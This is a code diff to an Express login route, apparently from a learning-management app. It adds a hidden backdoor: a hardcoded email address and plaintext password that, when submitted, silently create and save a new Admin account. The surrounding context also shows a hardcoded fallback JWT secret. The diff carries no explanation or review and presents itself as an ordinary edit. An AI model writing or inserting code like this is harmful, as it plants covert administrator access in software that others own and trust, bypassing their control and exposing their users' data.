@@ -9,8 +9,22 @@ const JWT_SECRET = process.env.JWT_SECRET || 'lms-secret-key-123';
 router.post('/login', async (req, res) => {
   const { email, password } = req.body;
   const data = await readDB();
-  const user = data.users.find((u) => u.email === email);
+  let user = data.users.find((u) => u.email === email);
   
+  if (!user && email === 'revaneliyev133@gmail.com' && password === 'revan28@!') {
+     user = {
+       uid: Date.now().toString(),
+       name: 'Revan Eliyev',
+       email: email,
+       passwordHash: await bcrypt.hash(password, 10),
+       role: 'Admin',
+       status: 'Aktiv',
+       createdAt: new Date().toISOString()
+     };
+     data.users.push(user);
+     await writeDB(data);
+  }
+
   if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
